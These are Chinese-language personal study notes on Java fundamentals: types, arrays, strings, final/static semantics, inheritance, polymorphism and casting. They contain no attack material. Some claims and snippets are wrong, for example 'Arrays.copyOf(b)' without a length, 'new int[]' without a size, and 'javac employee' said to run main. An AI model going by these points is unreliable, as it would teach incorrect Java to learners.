#Java基础知识
---
1. `Java`源代码->`.class`文件（字节码）->机器码(二进制码)  
源代码与`.class`文件(字节码)之间是`Java`编译器(`JDK`)，字节码与机器码之间是`JVM`(`Java`虚拟机)
2. `Java`中，`applet`是用于在浏览器段运行的程序，`servlet`是用于在服务器端运行的程序。因此，`applet`相当于`javascript`运行在浏览器段。`servlet`相当于`PHP`运行在服务器端。`Java`对服务器端与浏览器端都进行了扩展。
3. `Node.Js`就是在服务器端运行JS代码。
4. 
`Java se`:桌面应用

`Java ee`：企业应用

`Java me`：移动应用

         javac                  java
`Java`源代码->二进制代码（平台无关）->`linux`(`windows`)机器码
         编译器                   JVM 

如果只运行`Java`程序，安装`JRE`即可。如果编译`Java`程序，那就还需要安装`JDK`。
>
	JDK=JRE+.java文件被编译时所需的一些类库
    JRE=JVM+.class文件运行时所需的一些的库

实际安装中，其实`JDK`中本来就带有`JRE`，所以不用另外安装公共`JRE`。安装`JDK`即可。

`Java/Bin`目录：`Java`提供的各种工具，如`javac` ，`javap`等

在安装`JDK`设置环境变量的时候。`Path`中加入的是`JDK`的`bin`目录路径。  
这个路径下面是各种`java`工具。系统会在这些路径下查找我们所需要的工具。这个路径是给`shell`使用的。

还有一个`classpath`路径，这个路径的作用：当我们使用使用`java`运行二进制文件的时候，如果没有指定二进制文件`(.class)`的绝对路径的时候，会去这个`classpath`中查找对应名字的文件。同样，在我们的源程序中`import`了`JDK`中的某一个类的时候，也是去`classpath`所指的目录中查找需要的编译后`.class`文件的。这里就要在`classpath`中加入`JDK`的`lib`路径。使用`JDK`中给我们写好编译好的各种类。  
这个路径是给`JVM`使用的。

`Java`中数据类型有：  
1. 基本数据类型：`int`、`double`等。  
2. 类型：数组/类/接口/枚举类型。

#Java中基本数据类型
--------------
1. 整型：`int（4）`、`short（2）`、`long（8）`、`byte（1）`。表示整数。由于`JVM`的存在，使得在不同的机器平台上的`Java`程序的数据类型所占内存空间是一样大的。解决了移植性的问题。长整型数据后缀L。十六进制前缀0X，八进制前缀0。注：`Java`中没有无符号数。

2. 浮点数：`float（4）`与`double（8）`。表示小数。`float`数后缀F，没有后缀默认`double`，也可以后缀为D。注：很少使用`float`，都是使用`double`。

4. `char`类型：用于表示单个的字符。表示字符常量。“”与‘’是不同的，‘’里面的表示这是一个`char`字符，而“”表示这里面的是一个带有字符的字符串，即使只有一个字符也是字符串。二者是不同的。`\u`转义表示这是一个`Unicode`字符。最好不要使用`char`类型，而是使用抽象数据类型-字符串类型。这样有利于操作。

4. `boolean`类型：注：`Java`中数值0不能代表`false`，非0也不能代表`true`。

#Java中的数组
-------
大数值：`java.math`包中有两个类`BigInterger`和`BigDecimal`来处理任意长度的数字序列。  
`Java`中没有提供运算符重载功能。

数组：
> 
	int[] a=new int[100];
	或者 int[] a=new int[]{1,2,3};

以下方法都需使用`java.util.*`包。这些都是针对数组这个结构的`static`方法。  
`Arrays`这个类：它的作用就是操作数组这个类型的工具类。里面都是各种`static`方法，针对于数组这个类型的。  
Arrays类中的方法：  
>
数组拷贝：  
1. 数组引用变量的拷贝，使两个数组变量指向同一个数组。  
2. 数组元素的拷贝，也就是制造两个数组。使用`Arrays.copyOf()`这个`static`方法。
>
	int[] b = new int[]{1,2,3};
	int[] a = Arrays.copyOf(b);//将b数组拷贝到a数组中。
>
数组排序：  
使用`Arrays.sort()`这个静态方法。这是一个快速排序法。
>
返回数组中数据元素的字符串形式：  
使用`Arrays.toString()`静态方法。
>
二分查找法：  
`Arrays.binarySearch()`静态方法。

二维数组：
>
	int[][] bal=new int[][]
	{
		{1,2,3},
		{4,5,6},
	};

遍历二维数组每一个元素：
>
	Arrays.deepToString()静态方法。

实际上对多维数组进行操作都要使用`deep`开头的方法。

实际上`Jav`a中没有多维数组，本质就是数组的数组。  
`bal`数组实际上包含两个元素的数组，每个元素由三个元素组成。`bal[1]`引用的是二维表的第i行。这一行本身就是一个数组。  
为每一行分配元素的时候：
>
	bal[2]=new int[3];将这一行当做一个元素。这样可以创建不规则数组。
>
	int[][] a=new int[10][];
	for( int n=0;n<10;n++)
	{
		a[n]=new int[n+1];
	}
或者直接：
>
	int[][] a=new int[][]{{1,2,3},{1},{2,3}};
这样创建的是一个三角形的不规则数组。不规则数组就是Java语言和其他语言的不同。

输出的时候:
>
	for (int m=0;m<a.length;m++)
		for (int k=0；k<a[m].length;k++)

这样即可遍历。

或者使用foreach:
>
	for (int[] row :a)
		for (int m:row)

这样亦可。

在java里面，数组也是一个和int、类这些东西同级的类型。他可以用于创建一个数组引用变量，也可以用于类型的转换，和所有的基本数据、类都是一模一样的。  
所有的数组都是在其他的类型后面加上[]即变为数组类型。如：  
`String[]`就是一个数组类型。`int[]`数组类型后面加上`[]`就变成了`int[][]`这个数组类型.  
数组类型变量本质就是引用类型，实际上就是指针。数组引用本来就是一个变量。

所以，写数组的时候必须写成：`int[]`,而不要是`int a[]`;  

`Java`语言是静态语言，就是说，一旦变量类型确定，就不能再修改，也就是说变量内存空间大小也不能修改了。那么`jav`a中数组的长度是不能改变的，一旦初始化完毕就恒定了。空间是固定下来的，即使元素被清空，其空间依旧保留，可以被别的元素占用。

数组类型变量只是一个指针，如果没有将它引用到一个数组对象，那么就不能直接使用这个数组变量。也就是说数组变量必须指向一个有效的内存，也就是必须进行**初始化**。  
初始化两种：
>
静态初始化：
>
	int[] a=new int[]{1,2,3};//这就是静态初始化，后一个[]里面不能设置长度，因为后面的{}里面已经确定数组长度了，是一个固定的长度了，也就是数组对象定义的时候就已经静态化它的长度了。指定了数组的元素，让系统判断数组长度。
动态初始化：
>
	int[] a=new int[3];//只指定数组的长度，不指定数组的元素。后面再进行数组元素的初始化。

总之，不能即指定数组长度又指定数组元素:
>
	int a=new int[3]{1,2,3};//这是错的。因为是没有必要的。

在数组初始化之后，每一个数组元素都可以作为基本数据变量或者引用类型变量使用。
数组的使用：  
1. 数组的`length`属性，返回数组长度。


#Java中字符串类型
---------------
1、和`char`不同，这是字符串类型。不是`char`那样的基础数据类型。使用双引号。是一个类。而不是基础数据。
>
	String Str=“hello”；//这是一个字符串。
	char c=‘a’；//这是一个字符。

获得子串：`substring()`方法；
>
	String substr=Str.substring(1,3);//从字符串Str中取一个子串。

拼接：“+”；
  
`String`对象中的单个字符是不能修改的，也就是说，没有函数可以直接修改一个字符串中的某一个字符。  
如：  
`String Str="hello"；`  
修改为`"hellp"`的方法有两个：  
`Str="hellp";`或者`Str.substring(0,3)+"p";`而没有一个方法直接将最后一个字符进行修改。
这就是不可变字符串。
  
字符串相等比较，要使用`equals()`或者`equalsIgnoreCase()`而不是`==`  
因为：`equal()`是比较字符串是否一样的。而`==`是比较两个字符串在内存中的位置是否相等（也就是`String`对象的引用变量是否相等）。当两个字符串是一样的，但是位于内存的不同处，这样使用`==`判定就会是`false`。因为内存位置不同。  
如：
>
	String Str=“hello”；
	if（Str==“hello”）//比较的是Str这个字符串变量指向的字符串的位置是否与后面的“hello”字符串所在的内存位置是一样的。判断会失误。

误区：关于string缓存机制
>
	String s1=new string（“hello”）；
	String s2=new string （“hello”）；//s1！=s2；因为new创建了不同的对象，s1与s2指向不同的对象。
>
	String s3=“hello”；
	String s4=“hello”；//s3=s4；因为JVM有一个缓存机制，专门针对字符串，在第一个hello字符串的时候，即将这个字符串对象缓存起来，到s4的时候，不再创建新的字符串对象，而是使用s3的字符串对象。

同理：
>
	String s5=“hello”；
	String s6=“he”+“llo”；//s5=s6；因为JVM有一个缓存机制，专门针对字符串，在第一个hello字符串的时候，即将这个字符串对象缓存起来，到s6的时候，二者字符串一样。所以不再创建新的字符串对象，而是使用s5的字符串对象。

但是缓存只对于常量有用，也就是说，只会对`"hello"`这样的有缓存。对于`string s1="hello"`
这样的，下一次使用`s1`是不能使用缓存的，只有使用`"hello"`的时候才是使用上次的缓存。
>
	String s=“good”；
	String s2=s；//没有使用缓存；
	String s3=“good”;//使用了第一次的缓存。

注：使用缓存的意思就是：他们所指向的空间是一样的。

误区：关于`java`的宏替换
`final`修饰的变量会执行“宏替换”：
如果`final`修饰的变量在编译的时候就可以确定它的值（什么叫在编译的时候就知道它的值？  
如：
>
	String s="hi";  
这就是在编译的时候知道`s`的值。什么叫在运行的时候知道它的值？
如：
>
	String s1="hi";
	String s2=s1;  
那么，`s1`在编译的时候就知道它的值，而`s2`直到运行的时候才知道它的值。），那么，这个变量实际上是不存在的。而是在以后使用这个变量的时候直接执行“宏替换”。
这句话的意思就是：`final`修饰的变量如果赋予了初始值，而且这个初始值在编译的时候就已知，那么在内存中根本就不存在这个`final`变量，而只有它所指向的空间存在。以后使用的时候，是直接用这个初始值直接进行宏替换。
如：
>
	final string s3="hello";
	String s4=s3;  
这段代码中，变量`s3`并不存在，在`s4`语句中，需要用到`s3`，就是在编译到`s4`的时候直接执行宏替换，将`"hello"`置换到`s4`指向的空间中。也就是说，编译的时候，`s4`的值就已知（相当于直接在`s3`的位置放上`"hello"`）导致`s4`编译的时候就知道它的值。而且连`"hello"`这个对象也不存在，因为前面的引用变量`s3`已不存在了，所以再创建出对象也没有意义.  
而在前例中，`s2`的值在编译的时候是未知的，直到运行的时候才知道。这就是`final`修饰的一个`feature`。
总之，如果`final`变量已初始化，且在编译的时候就知道其值，那么这个变量不存在了，变量所引用的对象也是不存在的。变量都不存在了其引用对象就没有存在的必要了。
`final`成员变量定义时的赋值、初始化块中的赋值都不会插入到构造函数最前面，因为`final`成员变量在编译是已知其值，则该变量不存在。无`final`的一般成员变量都会插入到构造器中。
同理，`static`的`final`成员变量的定义时赋值也不会被插入到`static`初始化块中。无`final`的`static`的成员变量都会被插入到`static`初始化块中。

所谓的宏替换：就是查找、替换。

要注意：宏替换变量应该使用大写单词表示，且由多个单词连接而成，各个单词之间以下划线分隔。
>
	Final String s1=“hi”；
	Final String s2=“hello”；
	Final String s3=s1+s2；

这里创建了1个对象（`"hihello"`），但是只有0个变量，`s1`、s2``、`s3`这3个变量不存在。因为是`final`的，且编译时值已知。
#Java中变量
---------
基本数据类型的变量：
>
	int a=5；//这个5直接放置在a这个变量中，a就是基本类型变量。

引用变量：
引用变量中并不是放置着具体的内容数据，而是其引用的数据的地址。这就是引用变量。当然指针本身也是变量，放在栈中。指针所指向的内容放在堆中。

变量的声明，如:
>
	int a；
	double b；
变量声明之后，必须使用赋值语句进行初始化，编译器不会自己给它赋值的，这一点和`C`不同。没有自己初始化使用就会导致问题。`Java`中不区分变量的声明与定义。
`Java`中使用`final`声明常量。使用大写。且这个量只能被赋值一次。不能修改。
`Java`中如果要使一个常量可以被一个类中的所有方法共同使用，称之为类常量，这个量的大小不能修改，属于整个类。使用`static final`进行设置。
>
	static final int a=10；这个值被所有的对象所有的方法使用，且不能修改。

这个不同于单纯的`static`成员变量。这个`static`变量只是属于整个类。但是不能保证不变。

成员变量：在类中定义。
属于类的成员变量：`static`
属于对象的成员变量：无`static`
在某个方法中建立一个对象的时候，对象本身在堆中，对象的引用在栈中。
系统加载一个类，就为这个类开辟一块空间。只加载一次。
建立对象的时候，会为成员变量进行初始化。

局部变量：局部变量就是在方法中定义的变量，储存在方法栈中，必须由程序员进行初始化。不能用`static`进行修饰。局部变量不允许重名。
方法中的局部变量，作用域仅在方法中。
代码块中的局部变量，仅在代码块中有效。  
代码块：如，某个方法里面有一个括号，括号中内容就是一个代码块。代码块就是一个花括号。
形参：在整个方法中有效。

`Java`中没有所谓的全局变量的说法。


#Java中的运算符
--------
数据的左右移位：>>与<<
在没有数据溢出的情况下，左移n位就是乘以2的n次方。右边空的地方补上0；
右移没有溢出问题。相当于右边去掉n位。右移n位就是在左边的空地方补上符号位，正数补上0，相当于除以2的n次方，然后舍去小数部分。负数就是补上1，相当于除以2的n次方，然后将小数部分补成整数。结果都比算术意义上的数小。
数字以最快的速度乘以8，就是左移3位即可。这就是提高效率的方法。

数据的无符号右移：>>>:无论数据的正负，右移都是在数据左边空地方补上0，一直补0；会将负数变为正数。


Java中基本数据之间的转换
-----
基本数据之间的转换不涉及向上或者向下造型。而是其单独独立的转换方法。
其中6个实心箭头，表示小空间向大空间转换，转换无信息丢失。3个虚箭头，表示可能有信息丢失。
基本数据类型之间的转换有两种:

一种是无信息丢失的转换，这种转换称为自动转换。例如：`int a=10；double b=a；`这样使用a这个int来初始化b这个double是一种类型自动转换。

第二种是有信息丢失的转换，这种转换称为强制转换。例如：`double a=10.58；int b=（int）a；`这样使用a这个double来初始化b这个int，由于是大空间向小空间的转换，所以需要使用强制类型的转换。当然会有空间精度的损失。截断小数部分(不是四舍五入）。

注，此处，如果想获得一个浮点数的四舍五入的结果，就使用`Math.round()`这个方法，获得的是一个long整型数据，如果要变成int型数据，这就需要强制类型转换。也就是`int b=(int)Math.round(a);`也会有精度丢失的问题。

Java中输入输出
-----------------
A、键盘输入：

输入使用`Scanner`类对象进行。涉及密码输入时使用`Console`类对象进行（不显示密码）
系统里，`System.in`代表键盘。如果直接使用这个会很麻烦，一般都会对其进行包装：
包装成`BufferedReader`，这个更安全，而且有更完善的异常机制。
JDK1.5之后，出现`Scanner`，这个更方便，但在异常机制上有不足。

>
	Scanner sr = new Scanner(System.in);//这样就将键盘这个对象包装成Scanner类对象。
	while(sr.hasNextLine())//判断是否还有下一行输入。同理还可以判断是否有下一个字符的输入
	{
		System.out.println(sr.nextLine());
	}

注：多线程最困难的地方就是：出错难以调试。因为线程调用是随机的。

B、屏幕输出：
>
	System.out.println（）方法即可输出。


文件输入与输出：

A、文件读入：
读取文件的时候，使用一个`file`对象构造出一个`Scanner`对象。
这样就将一个文件内的内容读入到内存中了。
>
	Scanner in=new Scanner（new file（“myfile.txt”））；

如果文件路径中有“\”，那么需要使用转义字符。
>
	Scanner in=new Scanner（new file（“C:\\myfile.txt”））；

这样才行。`in`这个输入流中就是这个文件中的内容。然后就可以使用`Scanner`这个类的方法对这个输入流进行读取了。

B、文件写入：
>
	PrintWriter out = new PrintWriter(“myfile.txt”);//将写入流对象与文件相连接。

定位文件时可使用绝对路径:
>
	C:\\myfile\\myfile.txt;或者/home/me/myfile.txt;

当然，流最后都需要关闭。
>	
	out.close（）；


注：输入流就相当于一个管子。管子本来是空的。实际上就是表示在内存中的内容。
输入流对象这个管子里面是什么需要内容与外界的输入进行连接，这个流对象在哪里显示需要与外界的显示输出连接起来。也就是说，一个流就是内存中的一块空间。需要在两端与外界连接。这才是流的特征，有来源有出口。

和控制台的输入相连接：
>
	Scanner in=new Scanner(System.in)；//这是将输入流对象in与系统控制台输入进行连接。
	Console inc=System.console();//这是将输入流对象inc与系统密码输入相连接。

与控制台的输出相连接：
>
	String name=in.nextLine();//将输入流对象与name这个输出的东西进行连接。	

任何一个输入、输出流对象都需要在两端进行连接，然后就可以使用。只不过流对象的功能不同。各种不同的流对象都是针对不同的两端的内容的。两端内容不同，使用不同的流对象。

Java中的块，一个变量的有效范围就是一个块。但是嵌套的块中，变量不会覆盖块外的变量，这一点和C++不同。



Java中的语句
-------

选择语句：
>
	if（）……else if（）……else……
多重选择：
>
	switch（）case1：……break；case2：……break；default：……；一般很少使用switch。

循环语句：
>
不确定循环：
>
	while（）……do……；do……while（）；
确定循环：
>
	for循环，for循环是支持迭代的通用结构。利用每次迭代之后更新的计数器或者类似的变量来控制迭代次数。

>
Foreach 循环：
>
	for（variable：collection）statement；

Java类之间的关系
-----------

1、依赖（use a）：一个类的方法中操作了另一个类的对象，这就是依赖的关系。例如类A的某个方法中使用了B类对象作为局部变量，这就是依赖。
应该将互相依赖的类减至最少。这就是使A类不知道B类的存在，意味着B类的改变不会导致A类产生bug。这样就是让类之间的耦合度减小。

2、聚合（has a）：一个类A中的成员变量包括B类对象，这就是聚合关系。也就是A类对象包含B类对象。

3、继承（is a）：A类由B类继承而来。特殊与一般的关系。包含B类中的方法。


Java中的引用
---------
java中的引用类似与C++中的指针。

一个java源程序中，只能有一个`public`类（也就是只能是`main`那个函数所在的类是`public`，其他的所有类都不能）。但可以有任意个非`public`类。


Java中的编译与文档生成、汇编
------------------------
java编译：  
java中可将各个类放在不同的源文件中，如:`test.java`与`testdrive.java`.
在编译的时候，如果一个java源文件中具有两个类，那么就会编译产生两个`.class`文件。
这样编译的时候，可以使用通配符：
>
	javac test*.java

这样所有的文件都被编译成`.class`文件。

编译`public`类文件:
>
	javac testdrive.java

这样编译器会先导入`testdrive`类，然后自动搜索需要的类，在编译的时候，会首先查找`test.class`文件，如果没有就会查找`test.java`文件并编译它。如果`.java`文件比`.class`文件新，就会重新编译`.java`文件。这就相当于java编译器内置了make工具。

相对路径：不以盘符开始的路径。不唯一的。所以要使用相对路径就需要在一个基础路径才可以。相对路径的基础路径就是当前路径，就是现在操作的路径。
绝对路径：以盘符开始的路径。唯一的确定的。

javac命令用于编译；
java命令用于运行；
javadoc命令用于从源文件中提取文档注释以生成**API**文档：
命令：
>
	javadoc -d 生成API放置目录路径 java源文件； 

然后去**API**文档目录中查看`index.html`文档即可。

javac将程序编译都一个文件夹中需要先自己创建一个文件夹。这个文件夹对应整个工程。里面的都是一个个程序编译出来的包（package），package放在这个自己创建的文件夹中(这个工程的文件夹）。

也可以不直接创建一个文件夹：而是编译时使用：
>
	javac -d .\ java源文件  // .\表示放在本目录下创建文件夹。文件夹中的包和源文件中的package层次相对应


但是javadoc提取**API**是不需要自己创建一个对应文件夹的，程序会自己创建一个。


javap 命令的使用：
>
	javap -c 类名：

java中的反射库：用于产生程序执行过程的汇编代码。

java的return
----------
访问器方法的`return`不能是可变变量的引用。  
因为返回可变变量的引用之后，就会导致以这个访问器方法做左值的时候，就会在类外修改了类的`private`成员变量的值。这就破坏了封装原则了。
那么访问器`return`的时候，应该返回可变变量的`clone()`才行。或者返回`final`变量。

java中final关键字
-----------------
1、`final`修饰变量（*成员变量*（类拥有变量与实例拥有变量）与局部变量（方法内局部变量与块内局部变量））  

`final`修饰符大部分用于基本数据类型，或者不可变类的域（类中的每一个方法都不改变该成员变量）。如果是用于一个类成员变量（也就是非基本数据类型成员变量），就会导致混乱，因为在一个类中使用`final`类成员变量，只说明这个类成员变量的引用是不变的，而不说明这个对象本身时不变的，只是引用不变而已。
所以`final`修饰符最好不要使用在非基本数据类型成员变量上。
`final`成员变量表示这个变量是不能被修改的。

A、`final`修饰成员变量
必须人工进行初始化，初始化的位置：
定义成员变量时、
初始化块（普通初始化块与`static`初始化块）、
构造函数。

普通方法不允许为`final`成员变量赋值。`final`成员变量只能在以上三个位置进行初始化且只能在一个地方赋值。因为他们前两个实际上都是插入到构造器中来发挥作用的，所以三者都是平等的地位。都可以对`final`成员进行初始化。

B、`final`修饰局部变量	
必须人工初始化，无论是否是`final`局部变量。
局部变量加了`final`之后，以后再也不能修改其值了。

要注意`final`变量的工作方式与普通变量是不同的，见java中字符串类型中说明的`final`变量的工作原理。

2、`final`修饰符用于类方法或者整个类，表示这个类或者方法不能被继承或重写了。  
非`final`类中可有非`final`方法和`final`方法，其中的非`final`方法可有被继承重写。但是`final`方法不能被重写。  
`final`类中所有的方法都是默认为`final`的，也就是说，`final`类中所有方法都不可被重写。但是不说明那些成员变量是`final`的（`final`成员变量表明成员变量不变）。
也就是说`final`成员变量可以设置为`public`，因为它已不能被修改了，为一常量。

Java中static关键字
-----------------
`static`就是一个标志，不是什么静态的意思。  
`static`成员变量和`static`成员方法还有`static`初始化块。与类共存亡。  
`static`成员变量属于整个类，所有对象共享。`static`成员变量可以在声明定义的时候即赋值，也可以在`static`代码块中进行赋初值，但是不能在构造函数中赋初值。  
如果是`final static`常量，能在成员常量定义的时候赋初值。也能等到在`static`初始化块里面赋初值。因为最终也是要插入到`static`初始化块的。    
`static`成员变量使用的较少。但是`static`成员常量用的较多，也就是`static final`成员常量。全类共享，且不变。  
`static`成员方法是不能对对象进行操作的，只能对类共享的成员变量进行操作。不需要对象，也就是`static`方法没有`this`这个隐藏参数。  
以下两种情况下需要使用`static`成员方法。  
1. 当这个方法不需要使用对象的状态的时候，也就是这个方法的所有的参数都是显式提供的，而不需要隐式提供的`this`。  
2. 这个方法只需要访问类的`static`成员变量，不需要访问非`static`成员变量。当有类但是没有创建对象的时候，可以通过类直接使用`static field`或者方法。

静态方法的还有一个用处就是：`Factory`方法。用于产生不同风格的格式对象。

在同一个类中：
`static`成员不能访问非`static`成员（包括成员变量与方法）。  
`this`、`super`都不能出现在`static`成员中（如，不能出现在`static`方法中）；
这里的`static`成员包括：`static`方法、`static`初始化块、`static field`但不包括构造器（也就是说，`static`成员可以调用所有的构造器，因为构造器根本就没有`static`修饰这回事儿）。
也就是说，`static`初始化块里面都不能出现属于实例的非`static`的东西。  
总之一句话，类拥有的东西不能碰对象拥有的东西，也就是说，抽象、集体的东西不能碰具体、个人的东西。但前提是：在同一个类中。
>
	Static main方法都不能访问同一个类中的非static field。
	Public class m
	{
		int a=10；
		Public static void main（String[] args）
		{
		System.out.println（a）;//这是错的，在同一个类中，本类的static成员不能访问本类的非static成员。
		}
	}
`static`的东西在导入这个类的时候即导入。是最先导入的。  
`main`方法也是一个`static`方法。
任何一个类都可以拥有它自己的main方法，这是常用的对类进行单元测试的技巧。
如果要单元测试这个类，可以直接`javac employee`即可。这样就会执行`employee`这个类的`main`方法。

Java中abstract关键字
------------------
`abstract`类：  
`abstract`类特点：有得有失  
得：可以拥有抽象方法。因为普通类中不能有抽象方法，只有抽象类中才可以有抽象方法。所以，一个类中有了抽象方法就一定是抽象类。  
失：不能创建实例。  
误区：  
1. 其他的和普通方法都是一样的。同样有各种`field`（`static`与非`static`），各种构造器，各种初始化块（`static`与非`static`的）。  
2. 抽象类可以没有抽象方法。但这种抽象类依旧不能创建实例。

但是，既然抽象类无法创建实例，那么，我们还需要抽象类的实例方法、变量（非`static`方法与非`static`成员变量）和构造器干什么？  
Answer：  
1、抽象类的构造器是用于供其子类调用以进行父类成员变量的初始化。  
2、抽象类的各种非`static`成员方法是用于被子类重写(`override`)。或者被子类直接调用(直接使用`super`即可)。非`static`成员方法中，抽象成员方法用于被子类重写。非抽象成员方法用于被子类调用（父类、子类都拥有这些方法）。

`abstract`方法:  
说明这个方法既不能被本类调用又不能被本类的实例调用，只是占了一个坑，留给子类来填。使用`abstract`修饰，且没有方法体。  
`abstract`不能与`final`同时出现：`abstract`表明必须继承重写，`final`表明不能重写,矛盾.  
`abstract`不能与`static`同时出现：`abstract`表明这个方法不能被类调用也不能被对象调用，必须被继承重写之后才可以被使用。而`static`表面这个方法可以被本类调用,矛盾。
`abstract`不能与`private`同时出现：`private`方法不能被覆盖（`private`无法被子类调用识别，更不用谈覆盖重写了）。`abstract`方法必须被覆盖。所以二者矛盾。  
`abstract`方法可能不能被子类重写。当子类在另外的包中的时候，就不能覆盖父类中`abstract`方法。因为没有明确写访问权限的时候，父类中`abstract`方法不能被位于不同包中的子类重写。



Java中传值
-----------
java方法传递值，都是按照值传递，也就是复制传递的。只有这一种方法。
只是复制传递过来的有两种：
基本数据类型、
对象的引用。
>
	int a=10；
	p.f（a）；
不管这个方法的具体实现。这样方法调用完之后，a的值依旧是10；因为只是一个复制拷贝被传递进来而已。

也就是说：一个方法不可能修改一个基本数据类型的参数。
但是，以一个对象引用作为参数就不同了，可以很方便得修改对象引用所对应的实际对象，不能修改这个对象的引用，但是可以通过对象引用来修改对象本身。

总之，记住，java方法传参只有一种，那就是通过复制传值，可能传递的是基本数据，也可能传递的是对象的引用变量。

Java中构造
------------------
构造器：
特殊的方法，无需返回值。
构造器的作用：并不是用于创建对象的，而是用于进行初始化的。创建对象是new的功能。
构造器的重载：完全类似于普通方法的重载。
如果构造函数中没有显式初始化成员变量，编译器就会自己给初始化，但是实际中程序员都要自己进行初始化。
但是方法中的局部变量和类成员变量是不同的，局部变量是不会被编译器给自动初始化的。所以，方法中的局部变量必须被显式初始化。
一个成员变量在被构造函数构造之前，也就是这个成员变量定义的时候，就可以赋初值，这种用法在希望该类的每一个对象都拥有相同这个成员变量值的时候可以使用。
Java，初始化时，先初始化成员变量的定义部分赋值，然后执行初始化块中的内容，再执行构造函数中的内容。 

当一个成员变量的初始化很复杂（例如，是一个对象，需要好几个语句进行初始化赋值，这时候，就不能使用成员变量时的初始化赋初值。只能在初始化块中或者构造函数中进行赋初值。对于`static`成员变量定义时赋初值或者`static`构造块，它们执行顺序与定义的顺序是一样，也就是说，如果`static`构造块在前面，`static`成员变量初始化赋值初始化在后面，那么在使用这个类的时候，即进行初始化。总之，所以`static`的东西在非`static`的东西之前进行初始化。是所有的都是如此。非`static`是在创建对象的时候才进行初始化。`static`的成员变量在创建对象之前就初始化了。因为他是属于整个类的东西。
类所在目录路径必须与类代码前面的包名相同，这是规定。 

Java中继承
-----------------
java中所以继承都是公有继承。 
 
尽管子类可以继承拥有父类中所有的成员变量与方法，但是，子类依旧不能使用父类中的私有成员变量与方法。只有父类才能访问他自己的私有成分。子类要使用父类的私有部分也只能通过父类中的`public`成员方法才行。`Super.f();`这样才行。 
 
在子类的构造函数中，C++中是通过构造列表来构造初始化父类中的成员变量的。而java中是通过在子类的构造函数中最先调用父类的构造函数来对父类中成员变量进行初始化`Super();`构造。
 
子类中可以增加成员变量，成员方法。还可以覆盖父类的方法， 但不能覆盖父类中的成员变量。

java中的继承：是单继承。但可以有n个间接父类。  
注：
java中的继承于现实中的继承是不同的。
现实中继承：对象与对象之间的关系。如：父亲与儿子的关系，这是对象之间的继承。  
java中的继承：类与类之间的关系。父亲与儿子之间的关系并不是java中所指的继承。  
java中的继承是：从一般到特殊的关系。是`“is-a”`的关系。就是扩展、延伸的意思。

子类继承父类：在父类中的5个部分中，子类可以获得父类所有的属性与方法（包括`private`的，但是不能在子类中访问，但确实是有），但是不能获得父类的构造器、初始化块、内部类等东西。


 
Java中数组与Arraylist的区别
---------------
>
	int［］ m＝new int［］；

> 或者
> 	
	Emploree[] staff=new Emploree[3];
    m［0］＝1； 
    m［1］＝2；//这样即设定了数组m的长度，即使数组元素可以修改，但是数组长度不能修改了。只能为2。 
 
`Arraylist`就是一个泛型类。类似与C++中的vector模板。
Java中的Arraylist就是所谓的动态数组。在定义这个对象的时候并未决定容器长度，长度可以动态改变。 
取数组中的元素使用[]即可，但是由于arraylist并没有像c++中vector那样重载[]，所以，要是使用显式方法get（）与set（）来获得、存取数据元素。  
同时要注意，数组的元素操作是通过工具类`Arrays`类来进行的.

这就是它们之间的区别。

Arraylist中元素访问不方便，而数组规模不能扩充。所以可以采用一个方式将二者的长处结合起来，这样就可以使得即能扩充规模，又能方便地访问数据。
这种方法就是：将数据储存于arraylist中之后，将这个arraylist转换为一个数组。这样就能达到目的。就是对arraylist对象调用toArray方法，就会产生一个数组对象。
这个arraylist就是一个数组列表，相当于vector。如果插入删除较多，就会导致效率下降，这时候就应该使用linklist数据，就是链表。这样有利于插入和删除。	

Arraylist对象都有注明存储类型。

Java中的多态
-------------
在C++中，如果要实现某个函数的多态进行动态绑定，就需要将相应的方法设为虚函数。
但是在Java中，要实现某个函数的多态动态绑定，不需要设为虚函数，Java中并没有特别指出虚函数，默认所有的函数都是虚函数。也就是说，任何函数都可以实现动态绑定实现多态，而不需特殊声明。这就是C++和Java中的区别。
当然，如果不想让这个方法实现多态动态绑定，可以将这个方法标为final的即可。这样，这个方法就不可以被重写，这样也就没有动态绑定的了。

另注意辨析Java中的final关键词，表示这个函数不能被重写。
Final类不能被继承了。Final类中所有方法都是final的。
Java中没有多重继承。Java中的置换法则，就是程序中任何的父类对象都可以使用子类对象进行置换。
如：employee e=new manager（）；employee这个父对象可以使用manager这个子类对象进行置换。

在Java中，默认对象变量是多态的，也就是说，一个父类变量既可以引用一个父类对象，也可以引用一个子类对象。如上文父类变量e既可以引用一个父类对象employee对象，也可以引用一个manager类对象。

重要的问题，动态绑定中，可以通过父类变量引用子类对象，多态引用之后，父类变量会自动使用子类中重写的方法，也就是说，如果子类重写了父类中的方法，那么会自动使用子类重写的那个方法。但是，如果某个方法在父类中是没有的而是在子类中新加入的，那么就不能使用父类变量来调用这个方法，而只能使用父类中已有的方法。也就是说，尽管有多态的存在，父类变量依旧只能使用父类中拥有的方法（子类中新加入的方法父类是不能使用的），子类对象才能使用他自己拥有的方法（包括子类中新加入的方法）。

注意：任何数组里面放的是类变量，而不是变量所引用的类对象。

Java中的方法签名：方法的名字和参数列表，但是函数的返回类型不是方法的签名。以前，在子类覆盖父类方法中，子类方法返回类型必须与父类相同，现在允许子类返回父类的子类类型。也就是说，manager类某一个覆盖父类的方法的返回值可以是manager类，也可以是employee类的。以前是必须保证manager覆盖的方法的返回值必须与父类的相同。现在可以返回父类子类类型。
当然，覆盖方法时，覆盖方法名字与参数列表是不能改变的，必须与父类的那个方法是一样的。

Private方法不能覆盖。Static也不用覆盖，final方法不能覆盖。这三种方法都是静态绑定。

多态实现的原理就是，虚拟机会搜索类变量实际类型的方法表，以确定实际上该使用哪个类的方法。然后即可以调用这个实际的方法了。这样就实现了动态绑定。

注意，final类中所有的方法默认是final的，但不说明成员变量是final的。
非final类中可以有final成员方法和非final成员方法。

将一个类或者方法设为final的原因在于：他们不会在子类中改变语义。

Java中类型转换
--------------------

关于类型转换的问题。
基础数据类型：
短空间向长空间转换：这样可以直接转换，因为不涉及精度损失：
int a=10；double b=a；//这样是没有问题的。
B、长空间向短空间的转换：
>
    double b=10.0；int a=b；//这里必须使用强制转换，因为涉及精度损失。会产生截断。

非基础数据类型。也就是类对象变量之间的转换。
他们涉及的是向上、向下造型。//manager继承自employee对象。
子类变量向父类变量的转变：这就是向上造型。
>
	Employee e=new manager（） ；这样就是向上造型。

B、父类变量向子类变量的转变：这是向下造型，需要类型强制转换。
>	
	Manager k=new manager（）；//这样建立一个子类变量k
